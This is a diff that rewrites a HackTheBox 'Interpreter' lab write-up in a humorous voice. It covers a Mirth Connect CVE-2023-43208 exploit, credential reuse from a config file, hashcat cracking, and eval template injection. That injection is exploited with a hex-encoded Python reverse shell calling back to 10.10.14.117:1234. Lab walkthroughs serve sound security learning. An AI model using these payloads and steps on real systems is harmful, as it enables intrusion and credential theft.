@@ -1,6 +1,6 @@
 # Interpreter
 
-nmap scan as usual:
+Started like every responsible person on HTB does: by asking Nmap to tell me what’s wrong with this box.
 
 ```shellscript
 ┌──(jagerr㉿kali)-[~]
@@ -32,15 +32,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
 ```
 
-taking a look at the webpage:
+Taking a look at the webpage:
 
 <figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
-It seems we can download and launch some panels. Also we can access a secure site which leads to a login page:
+It looked like one of those “enterprise” dashboards where every button either downloads Java or ruins your weekend. I can also access a secure page, which led to a login page.
 
 <figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
-I tried the basic admin:admin but no luck, i started googling around for some exploits since i had no clue where also to look and i found a recent post about checking the version you're running: [https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208). Testing it myself i got:
+Naturally, I tried admin:admin because I am a scientist. It failed because the universe hates joy. At this point I had absolutely no clue where else to look (I tried gobuster, no luck), so I did what all great hackers do: panic-google.
+
+I found a post about checking the Mirth Connect version: [https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208). So I tried it:
 
 ```shellscript
 ┌──(jagerr㉿kali)-[~]
@@ -48,7 +50,7 @@ I tried the basic admin:admin but no luck, i started googling around for some ex
 4.4.0  
 ```
 
-So lets try out the PoC: [https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)
+And just like that: jackpot. Vulnerable version. So naturally I grabbed a PoC: [https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT) and ran it:
 
 ```shellscript
 ┌──(.venv)─(jagerr㉿kali)-[~/Downloads/cve]
@@ -75,23 +77,16 @@ id
 uid=103(mirth) gid=111(mirth) groups=111(mirth)
 ```
 
-we got a shell. lets stebalize and check the contents:
+Boom. Shell. Not root, but hey, we’re inside the house now. First priority: stabilize shell before it collapses like my emotional state.
 
 ```shellscript
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-mirth@interpreter:/usr/local/mirthconnect$ ls
-ls
-client-lib  logs                 mirth-server-launcher.jar  server-lib
-conf        mcserver             preferences                uninstall
-custom-lib  mcserver.vmoptions   public_api_html            webapps
-docs        mcservice            public_html
-extensions  mcservice.vmoptions  server-launcher-lib
 ```
 
-&#x20;when i check conf/mirth.properties, i find database credentials.
+Then I started snooping around `/usr/local/mirthconnect` like a raccoon in a server room. Found `conf/mirth.properties`, opened it, and immediately got rewarded for curiosity:
 
-<pre class="language-shellscript"><code class="lang-shellscript">cat conf/mirth.properties
-# Mirth Connect configuration file
+<pre class="language-shellscript"><code class="lang-shellscript"><strong>mirth@interpreter:/usr/local/mirthconnect$ cat conf/mirth.properties
+</strong># Mirth Connect configuration file
 
 # directories
 dir.appdata = /var/lib/mirthconnect
@@ -208,7 +203,7 @@ database.enable-read-write-split = true
 
 </code></pre>
 
-Lets connect!
+Whoever configured this password policy also configured: `password.minlength = 0` which is honestly the funniest part of the box. Anyway, time to log into MariaDB:
 
 ```shellscript
 mirth@interpreter:/usr/local/mirthconnect$ mariadb -u mirthdb -pMirthPass123!
@@ -269,7 +264,7 @@ show tables;
 MariaDB [mc_bdd_prod]> 
 ```
 
-Nice, lets check out PERSON and PERSON\_PASSWORD
+Checked databases, found `mc_bdd_prod`, looked at tables, and the interesting ones practically waved at me: `PERSON` and `PERSON_PASSWORD`:
 
 ```sql
 MariaDB [mc_bdd_prod]> select * from PERSON;
@@ -291,13 +286,40 @@ select * from PERSON_PASSWORD;
 1 row in set (0.000 sec)
 ```
 
-after A LOT of googling and chatgpting i found out how to format the hash finally and to decode.
+`PERSON` gave me a username: `sedric`\
+`PERSON_PASSWORD` gave me… a horrifying Base64 blob that looked like it was personally designed to waste my afternoon. And it did.
+
+this is where the real boss fight started: figuring out the hash format. After a LOT of googling, some ChatGPTing, and at least one spiritual negotiation with dark forces, I finally worked out that this was a `PBKDF2-HMAC-SHA256` value stored as a single Base64 blob containing:
+
+* first 8 bytes = salt
+* next 32 bytes = derived key
+
+So the process was:
+
+1. Base64-decode the full `PERSON_PASSWORD` value
+2. Split the raw bytes into:
+   * first 8 bytes (salt)
+   * remaining 32 bytes (derived key)
+3. Base64-encode each chunk separately
+4. Rebuild it in [Hashcat format](https://hashcat.net/wiki/doku.php?id=example_hashes): `sha256:<iterations>:<salt_b64>:<dk_b64>`&#x20;
+
+I did the whole split/re-encode process in **CyberChef**, and got:
+
+Salt (first 8 bytes): `u/+LBBOUnac=`
+
+<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+Derived key (next 32 bytes): `YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=`
+
+<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+Final Hashcat-ready format:
 
 ```shellscript
 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
 ```
 
-run hashcat
+Time to feed the GPU:
 
 ```shellscript
 $ hashcat -m 10900 -a 0 hash.txt rockyou.txt --potfile-disable
@@ -369,13 +391,17 @@ Started: Tue Feb 24 10:43:09 2026
 Stopped: Tue Feb 24 10:48:07 2026
 ```
 
-We got the password `snowflake1`. Login and get the flag:
+Hashcat fired up, spun the fans into another dimension, and after a few minutes of sounding like a jet engine, it cracked it:
+
+```shellscript
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
+```
+
+Password recovered: `snowflake1` Beautiful. Painful. Beautiful. Now we can log in as `sedric` and grab the flag:
 
 ```shellscript
 ┌──(jagerr㉿kali)-[~]
 └─$ ssh sedric@10.129.5.163
-sedric@10.129.5.163's password: 
-Permission denied, please try again.
 sedric@10.129.5.163's password: 
 Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
 
@@ -390,7 +416,13 @@ sedric@interpreter:~$ cat /home/sedric/user.txt
 a3ff728155973095f89f46fbbd1fb34d
 ```
 
-After some looking around i decided to use the checklist [https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html). I tried linpeas, but there was too much information i couldnt see anything interesting. Checking the path i saw /usr/local/bin, usually not that interesting but i decided to look anyway. here i found a notif.py script.
+> **User flag:** a3ff728155973095f89f46fbbd1fb34d
+
+Now for privesc. This is where the box stopped being “fun challenge” and became a three-day psychological operation.
+
+I tried linpeas, but it gave me enough output to publish a fantasy trilogy, and I could not see anything useful through the noise, so I went manual using [HackTricks checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html).
+
+I started checking PATH-related stuff and noticed `/usr/local/bin`. Usually this directory is where dreams go to die. This time? Plot twist. I found a script called `notif.py`.
 
 ```shellscript
 sedric@interpreter:/usr/local/bin$ cat notif.py 
@@ -453,32 +485,48 @@ if __name__=="__main__":
 
 ```
 
-reading the descrition of the script, it made me realize that i hadnt tried logging into the webpage with sedrics credentials yet. So i tried, and i got in. i did not see anything intersting, only the launch administrator button.
+The script is a local Flask app that:
+
+* accepts XML patient data
+* formats it into a notification string
+* then runs: `eval(f"f'''{template}'''")`
+
+And the docstring has the audacity to call it a safe templating function. Safe. Sure. And I am the Pope.
+
+At this point I’m thinking: okay, this is juicy, but how do I actually _reach_ this thing properly? Then the script description reminded me it expects data from MirthConnect… and that’s when I realized something embarrassing: I had never tried logging into the Mirth web page with **sedric’s credentials**. So I did, and it worked.
 
 <figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
-Clickign this would download a webstart.jnlp file. I spent a lot of time trying to run this, but in the end i realized there was an install script on the home screen of the website. using this script i had to solve more errors since im on linux arm64, but after a couple tears i ended up getting a new screen
+I got in and found… basically nothing useful except a “Launch Administrator” button. Naturally, clicking it downloaded a `webstart.jnlp` file, which is apparently computer for: “Congratulations, your next enemy is Java.”
+
+I then spent an absurd amount of time trying to run this thing. A truly unhealthy amount of time. The kind of time where you start bargaining with software: “Please just open and I will never say anything bad about Java again.”
+
+Eventually I noticed there was an install script on the site home page (which I absolutely should have used earlier, but hindsight is free. Can also be found at [https://www.meditecs.com/download-mirth-connect/](https://www.meditecs.com/download-mirth-connect/)). Because I’m on Linux ARM64, this became a bonus boss with extra compatibility errors.
+
+After enough troubleshooting, googling, and emotional damage, I finally got the launcher to run with:
 
 ```shellscript
 LD_LIBRARY_PATH=/usr/lib/aarch64-linux-gnu/jni:$LD_LIBRARY_PATH \
 /opt/mirth-administrator-launcher/launcher 2>&1 | tee /tmp/mirth-launcher.log
 ```
 
+Then I used `https://mirth-connect:443` to connect to:
+
 <figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
 
-when i used http://mirth-connect:80 i got a login screen.&#x20;
+Got a login prompt, logged in with Sedric’s creds, and FINALLY saw the actual admin interface.
 
 <figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
-Here i logged in with sedrics credentials and when i authenticated i finally got a new screen:
-
 <figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
-I fill in the dialog and continue. From the script we know we need to send a message and then it will do some magic so lets try:
+I was now approximately 78 years old.
 
-<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+From `notif.py`, I knew the app eventually receives patient data and does “safe” templating (read: `eval` on user-influenced content), so I tried sending a message through the GUI first.
 
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+I crafted an HL7 message and shoved in a payload, feeling very clever.
 
 ```
 \&|MirthConnect|HOSP|NotifyApp|Local|20260225103000||ADT^A04|MSG00001|P|2.5
@@ -487,7 +535,74 @@ PID|1||12345^^^HOSP^MR||{eval(bytes.fromhex("5f5f696d706f72745f5f28226f7322292e7
 PV1|1|O
 ```
 
-i tried sending a message thru the gui, but i could not get any response anywhere. so i tried using the api:
+Result: absolutely nothing visible anywhere. No output. No error. No shell. No joy. At this point I had entered the “stare at the wall” phase of exploitation.
+
+So instead of relying on the GUI mystery machine, I decided to hit the local Flask API directly from the box. First I sent a test XML payload with code in `<firstname>` and got a normal-looking response back:
+
+```shellscript
+sedric@interpreter:~$ cat > /tmp/patient.xml <<'EOF'                                       
+<patient>
+  <firstname>John</firstname>
+  <lastname>Doe</lastname>
+  <sender_app>MirthConnect</sender_app>
+  <timestamp>20260225T114400</timestamp>
+  <birth_date>14/07/1988</birth_date>
+  <gender>M</gender>
+</patient>
+EOF
+sedric@interpreter:~$ cd /tmp
+sedric@interpreter:/tmp$ wget -qO- \
+  --header='Content-Type: application/xml' \
+  --post-file=/tmp/patient.xml \
+  http://127.0.0.1:54321/addPatient
+Patient John Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$                 
+```
+
+Then I did the real sanity check:
+
+```shellscript
+sedric@interpreter:~$ cat > /tmp/patient.xml <<'EOF'                                       
+<patient>
+  <firstname>{1+1}</firstname>
+  <lastname>Doe</lastname>
+  <sender_app>MirthConnect</sender_app>
+  <timestamp>20260225T114400</timestamp>
+  <birth_date>14/07/1988</birth_date>
+  <gender>M</gender>
+</patient>
+EOF
+sedric@interpreter:~$ cd /tmp
+sedric@interpreter:/tmp$ wget -qO- \
+  --header='Content-Type: application/xml' \
+  --post-file=/tmp/patient.xml \
+  http://127.0.0.1:54321/addPatient
+Patient 2 Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$                 
+```
+
+Sent it. Response came back as: `Patient 2 Doe` . That was the moment. That beautiful, cursed moment. It worked. Template injection confirmed. The script was actually evaluating what I put into the field.
+
+After three days of pain, confusion, Java nonsense, and “why is this not doing anything,” I finally had a clean path. So I built a Python reverse shell (the script strips spaces, hence the encoding):
+
+```shellscript
+┌──(jagerr㉿kali)-[~/Downloads]
+└─$ python3                                                                   
+Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> rev_shell_code = f"""
+... import socket,os,pty
+... s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+... s.connect(("10.10.14.117",1234))
+... os.dup2(s.fileno(),0)
+... os.dup2(s.fileno(),1)
+... os.dup2(s.fileno(),2)
+... pty.spawn("/bin/bash")
+... """.strip()
+>>> rev_shell_code.encode().hex()
+'696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229'
+>>> 
+```
+
+I generated the payload, dropped it into `<firstname>`, and posted the XML to the local endpoint.
 
 ```shellscript
 sedric@interpreter:~$ cat > /tmp/patient.xml <<'EOF'                                       
@@ -508,80 +623,25 @@ sedric@interpreter:/tmp$ wget -qO- \
 Patient John Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$                 
 ```
 
-here we see it is indeed executing my test code. we can finally do something. lets do a test for template injection:
+Then I fired up a listener and waited, trying not to get my hopes up because this box had already hurt me too many times.
 
-```
-sedric@interpreter:/tmp$ cat > /tmp/patient.xml <<'EOF'                                       
-<patient>
-  <firstname>{1+1}</firstname>
-  <lastname>Doe</lastname>
-  <sender_app>MirthConnect</sender_app>
-  <timestamp>20260225T114400</timestamp>
-  <birth_date>14/07/1988</birth_date>
-  <gender>M</gender>
-</patient>
-EOF
-sedric@interpreter:/tmp$ wget -qO-   --header='Content-Type: application/xml'   --post-file=/tmp/patient.xml   http://127.0.0.1:54321/addPatient
-Patient 2 Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$ 
+Then I fired up a listener and waited, trying not to get my hopes up because this box had already hurt me too many times.
 
-```
-
-it works, we can probably try to get a shell with this:
-
-```
-┌──(jagerr㉿kali)-[~/Downloads]
-└─$ python3                                                                   
-Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
->>> rev_shell_code = f"""
-... import socket,os,pty
-... s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-... s.connect(("10.10.14.117",1234))
-... os.dup2(s.fileno(),0)
-... os.dup2(s.fileno(),1)
-... os.dup2(s.fileno(),2)
-... pty.spawn("/bin/bash")
-... """.strip()
->>> rev_shell_code.encode().hex()
-'696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229'
->>> 
-
-```
-
-add the encoded string to the payload:
-
-```
-sedric@interpreter:/tmp$ cat > /tmp/patient.xml <<'EOF'                                       
-<patient>
-  <firstname>{exec(bytes.fromhex("696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229").decode())}</firstname>
-  <lastname>Doe</lastname>
-  <sender_app>MirthConnect</sender_app>
-EOFatient>M</gender>1988</birth_date>mp>
-```
-
-and execute:
-
-```
-sedric@interpreter:/tmp$ wget -qO- \
-  --header='Content-Type: application/xml' \
-  --post-file=/tmp/patient.xml \
-  http://127.0.0.1:54321/addPatient
-```
-
-we get the shell. get the flag.
-
-```
+```shellscript
 ──(jagerr㉿kali)-[~/Downloads]
 └─$ nc -lvnp 1234                   
 listening on [any] 1234 ...
+```
+
+And then...
+
+```shellscript
 connect to [10.10.14.117] from (UNKNOWN) [10.129.6.244] 40168
 root@interpreter:/usr/local/bin# cat /root/root.txt
 cat /root/root.txt
 88b171147a195e970f693761e32566e8
-root@interpreter:/usr/local/bin# 
-
 ```
 
-my fricking god. that took so long. my god.
+> **Root flag:** 88b171147a195e970f693761e32566e8
 
-flag: 88b171147a195e970f693761e32566e8
+A shell landed. As root. I just sat there for a second staring at the terminal like it had apologized to me. Grabbed the root flag and got as quick as possible out of there.
